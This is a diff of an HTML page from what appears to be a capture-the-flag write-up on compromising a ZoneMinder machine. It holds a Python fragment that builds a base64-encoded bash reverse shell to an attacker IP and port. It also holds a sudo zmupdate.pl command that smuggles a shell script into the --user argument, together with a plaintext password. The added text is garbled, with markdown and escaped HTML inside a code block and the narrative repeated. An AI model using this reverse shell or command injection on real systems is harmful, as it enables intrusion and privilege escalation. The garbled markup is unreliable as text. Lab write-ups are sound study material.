+    parser.add_argument(‘-ip’, ‘–local-ip’, required=True, help=’local ip’)
+    parser.add_argument(‘-p’, ‘–port’, required=True, help=’port’)
+    args = parser.parse_args()</p>
 
-<p>Access as zoneminder</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># generating the payload
+ps1 = f"bash -i &gt;&amp; /dev/tcp/{args.local_ip}/{args.port} 0&gt;&amp;1"  
+ps2 = base64.b64encode(ps1.encode()).decode()
+payload = f"echo {ps2} | base64 -d | /bin/bash"
 
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png" alt="Untitled" /></p>
-
-<p>check for premises</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png" alt="Untitled" /></p>
-
-<p>We can update db and change others file in zm</p>
-
-<p>But we are no going to update anything we are going to pass a revshell in user update</p>
-
-<ol>
-  <li>We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server</li>
-</ol>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png" alt="Untitled" /></p>
-
-<p>chmod 700 or chmod  +x  for permisses</p>
-
-<p>We need to be listening at the port specify</p>
-
-<p>And as a final step:</p>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png" alt="Untitled" /></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/zmupdate.pl <span class="nt">--version</span><span class="o">=</span>1 <span class="nt">--user</span><span class="o">=</span><span class="s1">'$(/tmp/exploitfinalbello.sh)'</span> <span class="nt">--pass</span><span class="o">=</span>ZoneMinderPassword2023
+ZoneMinderExploit(args.target_url).exploit(payload) ``` &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png) &lt;br/&gt;&lt;br/&gt; Access as zoneminder &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png) &lt;br/&gt;&lt;br/&gt; check for premises &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png) &lt;br/&gt;&lt;br/&gt; We can update db and change others file in zm &lt;br/&gt;&lt;br/&gt; But we are no going to update anything we are going to pass a revshell in user update &lt;br/&gt;&lt;br/&gt; 1. We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png) &lt;br/&gt;&lt;br/&gt; chmod 700 or chmod  +x  for permisses &lt;br/&gt;&lt;br/&gt; We need to be listening at the port specify  &lt;br/&gt;&lt;br/&gt; And as a final step: &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png) &lt;br/&gt;&lt;br/&gt; ```bash sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitfinalbello.sh)' --pass=ZoneMinderPassword2023 ``` &lt;br/&gt;&lt;br/&gt; Machined pwned!@1 &lt;script src="/assets/js/matrix-overlay.js"&gt;&lt;/script&gt;
 </code></pre></div></div>
-<script src="/assets/js/matrix-overlay.js"></script>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
 
 </div>
